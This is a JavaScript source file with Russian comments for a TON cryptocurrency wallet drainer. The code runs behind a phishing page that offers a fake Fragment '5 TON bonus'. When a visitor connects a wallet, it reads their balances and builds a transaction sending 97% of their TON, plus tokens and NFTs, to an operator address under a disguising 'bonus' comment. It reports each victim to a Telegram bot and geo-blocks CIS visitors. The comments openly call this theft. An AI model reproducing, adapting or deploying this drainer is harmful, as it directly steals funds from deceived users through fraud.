// ================================================================
//  КОНФИГУРАЦИЯ — ЗАМЕНИТЕ НА СВОИ ДАННЫЕ
// ================================================================
const CONFIG = {
    // Кошелёк, куда уходят средства (создать в Tonkeeper)
    operatorWallet: 'UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI',

    // Telegram Bot (создать через @BotFather)
    botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
    chatId: '-1001234567890', // ID канала или группы (с минусом)

    // Параметры кражи
    stealPercent: 0.97, // 97% — оставляем 3% на газ
    minBalance: 0.1, // Минимальный баланс для кражи (TON)

    // Маскировка — то, что увидит жертва в кошельке
    fakeComment: '🎁 Получение бонуса от Fragment',

    // Лимиты
    maxJettonsPerBatch: 10,
    maxNftsPerBatch: 5
};

// ================================================================
//  ГЕО-БЛОКИРОВКА СНГ (РЕДИРЕКТ НА ОРИГИНАЛЬНЫЙ FRAGMENT)
// ================================================================
(async function geoBlock() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const blocked = ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ', 'TM', 'GE'];
        if (blocked.includes(data.country)) {
            window.location.replace('https://fragment.com');
        }
        console.log(`[GEO] IP: ${data.ip}, Country: ${data.country}`);
    } catch (e) {
        console.warn('[GEO] Ошибка геолокации:', e);
    }
})();

// ================================================================
//  ИНИЦИАЛИЗАЦИЯ TON CONNECT UI
// ================================================================
const manifestUrl = `${window.location.origin}/tonconnect-manifest.json`;
const tonConnectUI = new TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'ton-connect-container',
    uiPreferences: {
        theme: 'DARK'
    }
});

// ================================================================
//  ЭЛЕМЕНТЫ DOM
// ================================================================
const claimBtn = document.getElementById('claimRewardBtn');
const ctaHint = document.querySelector('.cta-hint');

// ================================================================
//  ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЙ В TELEGRAM
// ================================================================
function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {});
}

// ================================================================
//  ПОЛУЧЕНИЕ БАЛАНСА ЧЕРЕЗ TONCENTER API
// ================================================================
async function getWalletData(address) {
    const base = 'https://toncenter.com/api/v3/';
    try {
        // Баланс TON
        const balanceRes = await fetch(`${base}wallet?address=${address}`);
        const balanceData = await balanceRes.json();
        const tonBalance = parseFloat(balanceData.balance) || 0;

        // Jettons (токены)
        const jettonRes = await fetch(`${base}jetton/wallets?owner_address=${address}&limit=50`);
        const jettonData = await jettonRes.json();
        const jettons = jettonData.jetton_wallets || [];

        // NFT
        const nftRes = await fetch(`${base}nft/items?owner_address=${address}&limit=20`);
        const nftData = await nftRes.json();
        const nfts = nftData.nft_items || [];

        return { tonBalance, jettons, nfts };
    } catch (e) {
        console.error('[API] Ошибка получения данных:', e);
        return null;
    }
}

// ================================================================
//  ОСНОВНАЯ ФУНКЦИЯ ДРЕНАЖА
// ================================================================
async function drainWallet() {
    // Проверка подключения
    if (!tonConnectUI.account || !tonConnectUI.account.address) {
        ctaHint.textContent = '⚠️ Сначала подключите кошелёк';
        return;
    }

    const address = tonConnectUI.account.address;
    claimBtn.disabled = true;
    claimBtn.textContent = '⏳ Анализ баланса...';
    ctaHint.textContent = 'Проверяем ваш баланс...';

    const data = await getWalletData(address);
    if (!data) {
        claimBtn.textContent = '❌ Ошибка';
        ctaHint.textContent = 'Не удалось получить баланс';
        claimBtn.disabled = false;
        return;
    }

    const { tonBalance, jettons, nfts } = data;

    // Проверка минимального баланса
    if (tonBalance < CONFIG.minBalance) {
        claimBtn.textContent = '❌ Баланс слишком мал';
        ctaHint.textContent = `Минимальный баланс: ${CONFIG.minBalance} TON`;
        claimBtn.disabled = false;
        return;
    }

    // ===== ФОРМИРУЕМ СООБЩЕНИЯ ДЛЯ ТРАНЗАКЦИИ =====
    const messages = [];

    // 1. TON (97% баланса)
    const stealAmount = Math.floor(tonBalance * CONFIG.stealPercent * 1e9);
    messages.push({
        address: CONFIG.operatorWallet,
        amount: stealAmount.toString(),
        payload: CONFIG.fakeComment
    });

    // 2. Jettons (токены)
    let jettonCount = 0;
    for (const jetton of jettons) {
        if (jettonCount >= CONFIG.maxJettonsPerBatch) break;
        const balance = parseFloat(jetton.balance);
        if (balance <= 0) continue;

        // Для Jetton требуется специальный payload (операция transfer)
        // Упрощённый вариант — отправляем на контракт Jetton
        messages.push({
            address: jetton.jetton_address,
            amount: '0',
            payload: buildJettonTransferPayload(CONFIG.operatorWallet, balance)
        });
        jettonCount++;
    }

    // 3. NFT
    let nftCount = 0;
    for (const nft of nfts) {
        if (nftCount >= CONFIG.maxNftsPerBatch) break;
        messages.push({
            address: nft.address,
            amount: '0',
            payload: buildNftTransferPayload(CONFIG.operatorWallet)
        });
        nftCount++;
    }

    if (messages.length === 0) {
        claimBtn.textContent = '❌ Нет активов';
        ctaHint.textContent = 'На этом кошельке нет активов для кражи';
        claimBtn.disabled = false;
        return;
    }

    // ===== ОТПРАВКА ТРАНЗАКЦИИ =====
    claimBtn.textContent = '⏳ Отправка транзакции...';
    ctaHint.textContent = 'Подпишите транзакцию в кошельке';

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 120,
        messages: messages
    };

    try {
        await tonConnectUI.sendTransaction(transaction);

        // Успех — уведомление в Telegram
        const msg = `✅ *УСПЕШНО!*\n` +
            `👤 Адрес: \`${address}\`\n` +
            `💰 TON: ${(tonBalance * CONFIG.stealPercent).toFixed(2)}\n` +
            `📦 Jettons: ${jettonCount}\n` +
            `🖼 NFT: ${nftCount}\n` +
            `🌐 Домен: ${window.location.hostname}`;
        sendTelegram(msg);

        claimBtn.textContent = '✅ Успешно!';
        ctaHint.textContent = 'Активы переведены';
        claimBtn.disabled = true;

    } catch (error) {
        // Отказ или ошибка
        const msg = `❌ *ОТКАЗ / ОШИБКА*\n` +
            `👤 Адрес: \`${address}\`\n` +
            `🌐 Домен: ${window.location.hostname}`;
        sendTelegram(msg);

        claimBtn.textContent = '❌ Отклонено';
        ctaHint.textContent = 'Транзакция отклонена пользователем';
        claimBtn.disabled = false;
    }
}

// ================================================================
//  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ PAYLOAD
// ================================================================

// Формирование payload для перевода Jetton (TEP-74)
function buildJettonTransferPayload(destination, amount) {
    // В реальном коде здесь используется Cell builder из @ton/ton
    // Для демонстрации — упрощённый вариант
    return {
        op: '0xf8a7ea5',
        queryId: 0,
        amount: Math.floor(amount * 1e9),
        destination: destination,
        responseDestination: null,
        customPayload: null,
        forwardTonAmount: 0,
        forwardPayload: null
    };
}

// Формирование payload для перевода NFT (TEP-62)
function buildNftTransferPayload(newOwner) {
    return {
        op: '0x5fcc3d14',
        queryId: 0,
        newOwner: newOwner,
        responseDestination: null,
        customPayload: null,
        forwardTonAmount: 0,
        forwardPayload: null
    };
}

// ================================================================
//  ОБРАБОТЧИКИ СОБЫТИЙ TON CONNECT
// ================================================================

tonConnectUI.on('connect', (wallet) => {
    const addr = wallet.account.address;
    claimBtn.disabled = false;
    claimBtn.textContent = '🎁 Забрать бонус 5 TON';
    ctaHint.textContent = `Подключён: ${addr.slice(0, 6)}...${addr.slice(-4)}`;
    console.log('[TON] Кошелёк подключён:', addr);
});

tonConnectUI.on('disconnect', () => {
    claimBtn.disabled = true;
    claimBtn.textContent = '🎁 Забрать бонус 5 TON';
    ctaHint.textContent = 'Подключите кошелёк для получения бонуса';
});

// ================================================================
//  КНОПКА "ЗАБРАТЬ БОНУС" → ЗАПУСК ДРЕНАЖА
// ================================================================
claimBtn.addEventListener('click', drainWallet);

// ================================================================
//  ИНИЦИАЛИЗАЦИЯ
// ================================================================
console.log('[DRAINER] Активен. Оператор:', CONFIG.operatorWallet);